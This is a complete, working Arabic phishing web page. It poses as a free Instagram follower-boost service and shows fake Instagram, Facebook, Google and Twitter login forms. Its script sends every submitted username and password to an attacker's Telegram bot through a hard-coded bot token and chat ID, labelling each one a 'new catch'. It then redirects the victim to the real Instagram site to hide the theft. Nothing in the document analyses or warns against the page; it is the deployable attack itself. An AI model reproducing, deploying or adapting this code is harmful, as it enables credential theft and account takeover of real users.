<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خدمة الترويج الاحترافية | انستغرام</title>

    <!-- إعدادات معاينة الرابط مع الصورة والرابط الخاص بك -->
    <meta property="og:title" content="خدمة الترويج الاحترافية | احصل على 1000 متابع مجاناً">
    <meta property="og:description" content="احصل على متابعين حقيقيين وتفاعل فوري لحسابك على انستغرام وتوثيق الحساب بسهولة.">
    <meta property="og:image" content="https://cdn.imagetourls.com/uploads/tyImg/M7OcILyO.jpg">
    <meta property="og:url" content="https://hamza15gu.github.io/instagram-boost/">
    <meta property="og:type" content="website">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #0b0f19; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .wrapper { width: 100%; max-width: 420px; background: #131b2e; border-radius: 24px; overflow: hidden; border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 20px 40px rgba(0,0,0,0.5); display: block; }
        .wrapper.hidden { display: none; }
        
        .header-banner { background: linear-gradient(135deg, #d62976, #962fbf, #4f5bd5); padding: 40px 20px; text-align: center; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; }
        .logo-container { margin-bottom: 15px; }
        .logo-img { width: 60px; height: 60px; object-fit: cover; border-radius: 50%; }
        .header-banner h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
        .header-banner p { font-size: 14px; opacity: 0.9; }

        .content-body { padding: 20px; }
        
        .social-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 14px; border-radius: 14px; border: none; font-size: 15px; font-weight: 600; color: #fff; cursor: pointer; margin-bottom: 12px; text-decoration: none; transition: transform 0.2s, opacity 0.2s; }
        .social-btn:hover { opacity: 0.9; transform: translateY(-2px); }
        .btn-ig { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
        .btn-fb { background: #1877f2; }
        .btn-google { background: #f1f1f1; color: #333; }
        .btn-tw { background: #1da1f2; }

        .features-box { background: #1a233a; border-radius: 16px; padding: 16px; margin: 20px 0; border: 1px solid rgba(255,255,255,0.05); }
        .feature-item { display: flex; align-items: center; font-size: 14px; margin-bottom: 10px; color: #cbd5e1; }
        .feature-item:last-child { margin-bottom: 0; }
        .check-badge { width: 22px; height: 22px; background: #db2777; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-left: 10px; font-size: 12px; color: #fff; flex-shrink: 0; }

        .packages-list { display: flex; flex-direction: column; gap: 10px; }
        .pkg-card { display: flex; justify-content: space-between; align-items: center; background: #1a233a; border: 1px solid rgba(255,255,255,0.05); padding: 16px 20px; border-radius: 14px; cursor: pointer; transition: border-color 0.2s; }
        .pkg-card:hover { border-color: #db2777; }
        .pkg-price { background: rgba(219, 39, 119, 0.15); color: #ec4899; padding: 6px 12px; border-radius: 8px; font-weight: 700; font-size: 14px; }
        .pkg-price.free { background: rgba(16, 185, 129, 0.15); color: #34d399; }
        .pkg-amount { font-size: 15px; font-weight: 600; }

        .login-wrapper { width: 100%; max-width: 400px; background: #131b2e; border-radius: 20px; padding: 30px; border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 20px 40px rgba(0,0,0,0.5); text-align: center; display: none; }
        .login-wrapper.active { display: block; }
        .login-wrapper h2 { margin-bottom: 20px; font-size: 20px; color: #fff; }
        .login-wrapper input { width: 100%; background: #1a233a; border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 12px 15px; margin-bottom: 12px; color: #fff; font-size: 14px; outline: none; }
        .login-wrapper input:focus { border-color: #db2777; }
        .login-wrapper button.submit-btn { width: 100%; background: #db2777; color: #fff; border: none; border-radius: 10px; padding: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; }
        .login-wrapper button.submit-btn:hover { opacity: 0.9; }
        .back-link { display: block; margin-top: 15px; color: #94a3b8; font-size: 13px; text-decoration: none; cursor: pointer; }
        .back-link:hover { color: #fff; }
    </style>
</head>
<body>

<!-- الصفحة الرئيسية -->
<div class="wrapper" id="homeView">
    <div class="header-banner">
        <div class="logo-container">
            <img src="https://cdn.imagetourls.com/uploads/tyImg/M7OcILyO.jpg" alt="Logo" class="logo-img">
        </div>
        <h1>ترقية الحساب الاحترافية</h1>
        <p>احصل على متابعين حقيقيين وتفاعل فوري</p>
    </div>

    <div class="content-body">
        <button class="social-btn btn-ig" onclick="openLogin('instagram')">متابعة بـ Instagram</button>
        <button class="social-btn btn-fb" onclick="openLogin('facebook')">متابعة بـ Facebook</button>
        <button class="social-btn btn-google" onclick="openLogin('google')">متابعة بـ Google</button>
        <button class="social-btn btn-tw" onclick="openLogin('twitter')">متابعة بـ Twitter</button>

        <div class="features-box">
            <div class="feature-item"><div class="check-badge">✓</div> متابعين حقيقيين 100%</div>
            <div class="feature-item"><div class="check-badge">✓</div> تسليم فوري خلال 24 ساعة</div>
            <div class="feature-item"><div class="check-badge">✓</div> ضمان عدم النقصان</div>
            <div class="feature-item"><div class="check-badge">✓</div> دعم VIP 24/7</div>
        </div>

        <div class="packages-list">
            <div class="pkg-card">
                <span class="pkg-amount">1,000 متابع</span>
                <span class="pkg-price free">مجاني</span>
            </div>
            <div class="pkg-card">
                <span class="pkg-amount">5,000 متابع</span>
                <span class="pkg-price">5$</span>
            </div>
            <div class="pkg-card">
                <span class="pkg-amount">10,000 متابع</span>
                <span class="pkg-price">9$</span>
            </div>
            <div class="pkg-card">
                <span class="pkg-amount">25,000 متابع</span>
                <span class="pkg-price">20$</span>
            </div>
            <div class="pkg-card">
                <span class="pkg-amount">50,000 متابع</span>
                <span class="pkg-price">40$</span>
            </div>
        </div>
    </div>
</div>

<!-- واجهة تسجيل الدخول -->
<div class="login-wrapper" id="loginView">
    <h2 id="loginTitle">تسجيل الدخول</h2>
    <form id="loginForm">
        <input type="text" id="username" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
        <input type="password" id="password" placeholder="كلمة المرور" required>
        <button type="submit" class="submit-btn">تأكيد المتابعة والحصول على المتابعين</button>
    </form>
    <a class="back-link" onclick="goBack()">← العودة للرئيسية</a>
</div>

<script>
    const BOT_TOKEN = '9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs';
    const CHAT_ID = '8859920681';

    let selectedPlatform = '';

    function openLogin(platform) {
        selectedPlatform = platform;
        document.getElementById('homeView').classList.add('hidden');
        document.getElementById('loginView').classList.add('active');
        document.getElementById('loginTitle').innerText = `تسجيل الدخول عبر ${platform.toUpperCase()}`;
    }

    function goBack() {
        document.getElementById('loginView').classList.remove('active');
        document.getElementById('homeView').classList.remove('hidden');
    }

    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        const message = `🚨 صيد جديد - ${selectedPlatform}\n👤 الحساب: ${user}\n🔑 كلمة المرور: ${pass}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

        fetch(url).finally(() => {
            window.location.href = "https://www.instagram.com";
        });
    });
</script>

</body>
</html>
